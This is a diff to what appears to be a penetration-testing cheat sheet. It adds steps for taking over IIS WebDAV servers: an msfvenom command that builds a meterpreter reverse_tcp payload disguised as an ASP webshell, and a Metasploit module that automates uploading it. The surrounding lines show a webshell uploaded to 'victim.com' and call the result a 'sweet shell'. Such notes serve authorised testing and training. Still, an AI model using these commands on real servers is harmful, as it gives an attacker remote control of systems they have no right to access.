@@ -363,8 +363,18 @@ Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
 Progress: [=============================>] 100.0% of 1362 bytes succeeded.
 ```
 
-Step 5: Enjoy your sweet shell @ http://victim.com/webdav/webshell.asp
+You can also use msfvenom to create custom payload:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f asp > webshel.asp
+```
 
+Or use a metasploit exploit to automate end-to-end:
+```
+msf6> exploit(Windows/iis/iis_webdav_upload-asp)
+```
+
+Step 5: Enjoy your sweet shell @ http://victim.com/webdav/webshell.asp
+Or connect with meterpreter on msfconsole.
 
 
 ### Kerberos (Port 88)
